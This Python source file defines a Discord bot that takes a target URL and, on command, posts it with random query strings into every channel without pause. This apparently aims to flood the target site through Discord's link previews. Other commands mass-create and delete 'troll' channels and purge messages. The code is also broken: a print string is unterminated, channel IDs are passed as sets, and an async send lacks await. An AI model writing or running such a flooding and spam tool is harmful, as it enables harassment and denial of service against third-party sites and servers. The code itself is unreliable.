import discord
import config
import random
import asyncio
import requests
import os
from config import token, ownerid
from discord.ext import tasks

url = input("URL: ")
chanid = input("Main Channel ID: ")
guildid = input("Guild ID: ")
headers = { 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0' }
r = requests.get(f"{url}", headers=headers)
if r.status_code == 200:
    print("[+] URL Check Passed [+]")
else:
    print("[-] Invalid or Blocked URL  [-]")
    print("Status Code:", r.status_code)
    exit()


def mkstr(length):
    return ''.join(random.choice('1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm') for i in range (length))

class gangClient(discord.Client):
    async def on_ready(self):
        os.system('clear')
        print(f'Logged in as: {self.user.name}')
        print(f'Bot ID: {self.user.id}')
        print(f'URL set to: {url}')
        chn = client.get_channel({chanid})
        await chn.send(f"Bot ready - Current target: `{url}`")

    async def on_message(self, message):
        if message.content.startswith('!troll'):
            while True:
                channel = client.get_all_channels()
                for channel in client.get_all_channels():
                    try:
                        await channel.send(f"{url}?{mkstr(10)} , {url}?trolled{mkstr(10)} , {url}?r={mkstr(10)}")
                        await asyncio.sleep(0.2)
                    except KeyboardInterrupt:
                        chn = client.get_channel({chanid})
                        chn.send("CTRL^C Detected - Goodbye.")
                        exit()
                    except discord.errors.Forbidden:
                        print("[403] Ignoring error like a giga chad")
                    except discord.errors.NotFound:
                        print("[404] Bot attempted to send message in unknown channel (Good thing if you're nuking).
                    except AttributeError:
                        print("[AttributeError] Bot tried to send message in category channel, lol what an idiot.")
                        
        if message.content.startswith('!setup'):
            guild = client.get_guild({guildid})
            chan = client.get_channel({chanid})
            i = 0
            while i != 50:
                await guild.create_text_channel(f"troll-{mkstr(8)}")
                i = i + 1
                if i == 50:
                    await chan.send("Setup complete.")

        if message.content.startswith('!nuke'):
            channel = client.get_all_channels()
            for channel in client.get_all_channels():
                if channel.name.startswith("troll-"):
                    await channel.delete()

        if message.content.startswith('!delmsgs'):
            chan = client.get_channel({chanid})
            await chan.purge()
                              
        if message.content.startswith('!help'):
            chan = client.get_channel(962375865264660590)
            await chan.send("hi welcome to lean inc.\n\n!setup - sets up channels\n!troll - starts the bombardment\n!nuke - deletes all troll channels\n!delmsgs - purges all msgs in main channel")

client = gangClient()
client.run(token)


